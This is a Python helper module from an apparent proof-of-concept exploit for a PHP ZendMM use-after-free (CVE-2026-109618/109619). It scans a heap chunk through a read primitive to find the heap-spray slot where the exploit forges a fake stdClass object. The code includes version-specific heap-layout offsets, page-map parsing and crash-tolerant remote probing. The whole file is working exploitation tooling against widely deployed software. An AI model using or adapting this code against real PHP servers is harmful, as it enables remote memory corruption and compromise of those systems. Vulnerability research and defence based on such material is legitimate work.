#!/usr/bin/env python3
# INDEX: locate var_hash-uaf spray slot in chunk | all | needs read primitive + chunk base
"""Canonical spray-slot discovery scan (CVE-2026-109618 / CVE-2026-109619).

Locate the 280-byte var_hash-UAF spray run inside a ZendMM 2MB chunk and return
the absolute address `S` (the data pointer of a spray string, where the fire
forges its stdClass). The geometry is shared across SAPIs/builds: the chunk is
heap_ref & ~0x1FFFFF, pages step by 0x1000 and are biased to the ~117 band
where the reclaimed run lands, each page holds 16 slots at a 320-byte stride,
and S = slot_addr + 0x18.

The variant supplies its own `read_slot_fn` (probe one slot-header address, any
return type), `match` predicate (accepts that return, True iff the slot is a
live spray), page `band` (the likely-home-first page order), whether to also
return the chunk-relative offset (`with_offset`), and whether to consult the
ZendMM page map first (`use_map`). Pure stdlib, safe under python3 -I.
"""
from __future__ import annotations

import os
import struct
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)

PAGE = 0x1000
SLOT_STRIDE = 320
NSLOTS = 16
DATA_OFF = 0x18


def find_spray_slot_scan(read_slot_fn, chunk, *, match, band,
                         with_offset=False, use_map=None, probe_budget=900):
    """Scan `chunk` for a live spray slot and return S (or (S, offset)).

    read_slot_fn(slot_addr) probes one 320-stride slot header; `match(result)`
    is True for a live spray. `band` is the likely-home-first page order. If
    `with_offset`, return (S, slot_addr - chunk); else S. `use_map` selects the
    map fast-path (A) over the crash-tolerant info-agnostic probe (B). On no hit
    / exhausted budget: None (or (None, None) with with_offset).
    """
    def _nf():
        return (None, None) if with_offset else None

    def _ret(addr):
        S = addr + DATA_OFF
        return (S, addr - chunk) if with_offset else S

    if use_map:
        # ---- Pass A: map-based fast path ----------------------------------
        # Trust the ZendMM page map when the spray run is still flagged in-use
        # (8.5.11/8.5.12). Collect in-use run pages (SRUN of any bin, or LRUN)
        # and order them likely-home-first; the bin index is NOT filtered on,
        # since the run is classified differently per build (bin-320 SRUN on
        # 8.5.11, 1-page LRUN on 8.5.12). Each candidate page is DETECTED with
        # one in-run slot (slot 5), so a run of flagged pages costs one probe
        # each.
        probes = [0]

        def _probe(addr):
            # One read, crash-tolerant. read_slot_fn already returns None on a
            # 500 / dropped connection / timeout and self-rate-limits on
            # crashes; the try/except is belt-and-braces. DEFAULT timeout --
            # never shortened (a short timeout truncates valid 280B reads into
            # None too).
            probes[0] += 1
            try:
                return read_slot_fn(addr)
            except Exception:
                return None

        map_likely, map_other = [], []
        r = _probe(chunk + 0x40)
        if r is not None:
            _heap_size, cdata = r
            # Page map at chunk+0x250; data starts at chunk+0x58 -> map off 0x1F8.
            MAP_OFF = 0x1F8
            if len(cdata) >= MAP_OFF + 512 * 4:
                for pn in range(1, 512):
                    info = struct.unpack_from('<I', cdata, MAP_OFF + pn * 4)[0]
                    if info == 0:
                        continue
                    is_srun = (info & 0x80000000) != 0
                    is_lrun = (info & 0x40000000) != 0
                    if not (is_srun or is_lrun):
                        continue
                    likely = ((is_srun and (info & 0x1F) == 16)       # bin-320 SRUN
                              or (is_lrun and (info & 0xFFFF) == 1))   # 1-page LRUN
                    (map_likely if likely else map_other).append(pn)

        # ---- Page order + slot strategy -----------------------------------
        # On 8.1-8.4 the freed inner-object arData is reclaimed by the spray but
        # its page-map word reads 0, so Pass A never lists the run -- the probe
        # must be info-AGNOSTIC. Bias the scan to the upper used region just
        # above the payload buffers where the reclaimed 280B run sits
        # (empirically pages ~88 and ~117/118). Detect each page with a SINGLE
        # in-run slot: the contiguous spray run always covers slot 5 (observed
        # starts: slot 3 on 8.5.12, 4 on 8.4.26, 5 on 8.1.34 -- all <= 5 <= 15),
        # so one slot-5 read per page finds the spray page with just one
        # crash/stall-prone miss per wrong page, instead of sweeping all 16 slots
        # of every wrong page (the 8.2/8.3 worker STALLS a full read-timeout on a
        # junk slot whose +0x10 is a huge bogus length).
        hot = [117, 118, 88, 116, 119, 115, 120, 114, 121, 89, 87, 90, 86]
        allrest = list(range(1, 512))

        def _dedup(seq):
            seen, out = set(), []
            for p in seq:
                if 1 <= p < 512 and p not in seen:
                    seen.add(p)
                    out.append(p)
            return out

        detect_order = _dedup(map_likely + hot + map_other + list(band) + allrest)

        # DETECT sweep: one in-run slot (5) per page. Any spray slot is a valid S.
        for pn in detect_order:
            if probe_budget is not None and probes[0] >= probe_budget:
                break
            if match(_probe(chunk + pn * PAGE + 5 * SLOT_STRIDE)):
                return _ret(chunk + pn * PAGE + 5 * SLOT_STRIDE)

        # WIDEN sweep: insurance, only on the priority pages, in case slot 5
        # happened to fall outside the run on some build. All other slots,
        # likely-run-first.
        widen_pages = _dedup(map_likely + hot + map_other + list(band))
        widen_slots = [3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 0, 1, 2]
        for pn in widen_pages:
            run_start = chunk + pn * PAGE
            for slot in widen_slots:
                if probe_budget is not None and probes[0] >= probe_budget:
                    return _nf()
                if match(_probe(run_start + slot * SLOT_STRIDE)):
                    return _ret(run_start + slot * SLOT_STRIDE)
        return _nf()

    # ---- Pass B: crash-tolerant info-agnostic flat probe ------------------
    # Scan every page in `band` at the 320-byte stride for a live spray slot, so
    # a freed-run (chunk-map info==0) page the spray reclaimed is still found.
    probes = 0
    for pn in band:
        run_start = chunk + pn * PAGE
        for slot in range(NSLOTS):
            if probe_budget is not None and probes >= probe_budget:
                return _nf()
            probes += 1
            if match(read_slot_fn(run_start + slot * SLOT_STRIDE)):
                return _ret(run_start + slot * SLOT_STRIDE)
    return _nf()
